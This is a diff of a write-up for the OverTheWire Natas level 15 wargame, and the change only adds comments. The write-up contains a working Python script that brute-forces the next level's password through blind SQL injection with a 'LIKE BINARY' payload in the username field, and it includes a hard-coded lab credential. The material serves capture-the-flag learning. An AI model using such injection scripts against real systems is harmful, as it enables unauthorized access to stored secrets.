@@ -36,25 +36,36 @@ injecting the following in the username will give the pass
 ```
 import requests
 import string
-characters = string.ascii_letters + "0123456789"
+characters = string.ascii_letters + "0123456789"  
 
 username = 'natas15'
 password = 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx'
 
 url = 'http://natas15.natas.labs.overthewire.org/?debug=true'
 sessions = requests.Session()
-seen = list()
+seen = list()  #initialze the empty seen password list
 
 while (True):
     for ch in characters:
         print("trying character with password" , "".join(seen) + ch)
 
         response = sessions.post(url,data={ "username" : 'natas16" AND BINARY password LIKE "' + "".join(seen) + ch +'%" #'},auth = (username,password))
+        
+        #example. if `hWs%` returns as user exists then the password starts with `hWs....` 
 
-        content = response.text
+        content = response.text   #crucial step to log the response.text in a variable as we will further check the "user exists" string and determine if the character is a part of the password or not 
+        
         if "user exists" in content:
             seen.append(ch)
-            break
+            break #break out of the for loop and start again 
 ```
+
+
+
+
+
+
+
+
 ### References
 https://www.youtube.com/watch?v=krp0qCOAnFE&list=PL1H1sBF1VAKWM3wMCn6H5Ql6OrgIivt2V&index=12
